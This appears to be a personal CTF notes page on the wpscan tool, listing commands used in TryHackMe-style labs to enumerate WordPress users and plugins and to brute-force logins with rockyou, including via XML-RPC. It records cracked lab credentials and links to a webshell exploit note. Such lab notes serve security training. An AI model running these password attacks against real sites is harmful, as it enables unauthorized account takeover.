# wpscan

WordPress scanner for version detection, user enumeration, vulnerable plugin/theme checks, and password attacks against WordPress login surfaces.

## Commands Used

### Enumerate vulnerable plugins and users

```bash
wpscan --url http://internal.thm/blog -e vp,u
```

Used on: **Internal**

confirmed WordPress context and user enumeration surface.

### Brute-force a known user

```bash
wpscan --url http://internal.thm/blog --usernames admin --passwords /usr/share/wordlists/rockyou.txt --max-threads 50
```

Used on: **Internal**

found `admin:my2boys`.

## Related

- [../../exploits/web-rce/wordpress-theme-editor-webshell.md](../../exploits/web-rce/wordpress-theme-editor-webshell.md)



### Enumerate WordPress users

```bash
wpscan --url http://blog.thm --enumerate u
```

Used on: **blog**

recovered candidate usernames before XML-RPC brute force.

### XML-RPC password attack

```bash
wpscan --url http://blog.thm --password-attack xmlrpc -U users.txt -P /usr/share/wordlists/rockyou.txt -t 50
```

Used on: **blog**

found `kwheel:cutiepie1`.
